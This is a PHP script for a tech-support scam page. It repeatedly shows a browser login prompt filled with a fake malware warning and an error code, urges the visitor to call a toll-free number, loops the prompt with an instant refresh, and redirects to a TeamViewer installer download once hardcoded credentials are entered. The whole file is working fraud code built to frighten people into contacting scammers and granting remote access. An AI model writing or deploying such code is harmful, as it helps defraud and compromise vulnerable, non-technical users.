<?php

    session_start();

    $_user = 'windows2016d';
    $_password = 'microsoft1';

    if ($_SERVER['PHP_AUTH_USER'] != $_user || $_SERVER['PHP_AUTH_PW'] != $_password ) {

        if(isset($_SESSION['login_attempts'])){ $_SESSION['login_attempts']++; }else{$_SESSION['login_attempts'] = 11;}

        if($_SESSION['login_attempts'] == 80){
            header('Location: DF10_10010_jhs017.php');
            exit;
        } else {

           header('WWW-Authenticate: Basic realm="Suspicious movement distinguished on your IP address because of a spyware introduced in your PC. Call Toll Free now @ +1-888-888-8888 for any help. Your information is at a Serious risk. There is a Computer framework record missing because of some Harmful malware infection Debug Malware error (code 0x80093acf) . Call Immediately to correct the issue. Please do not Open web browser or make any changes for your Security Issue to avoid data loss & Corrupt system files & drivers, Call immediately to save Hard disk Faliure & Data loss. This Harmful malware is affecting your online information & can Track Financial Activity Contact Certified Tecnicians  at +1-888-888-8888 PLEASE DO NOT SHUT DOWN OR RESTART YOUR COMPUTER, DOING THAT MAY LEAD TO DATA LOSS AND FAILIURE OF OPERATING SYSTEM, ONLINE INFORMATION. HENCE NON BOOTABLE SITUATION RESULTING COMPLETE DATA LOSS . CONTACT ADMINISTRATOR DEPARTMENT TO RESOLVE THE ISSUE ON +1-888-888-8888 (TOLL FREE)."');
           header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
 $sec = "0";
 header("Refresh: $sec; url=$page");
         echo "<html><head><title>Internet Security Damaged !!! Call Help Desk</title></head><body>";


            exit;
        }
    } else {

        header('Location: DF10_10010_jhs017.php');
        header('Location: http://download.teamviewer.com/download/TeamViewer_Setup_en.exe');

        exit;
    }
?>
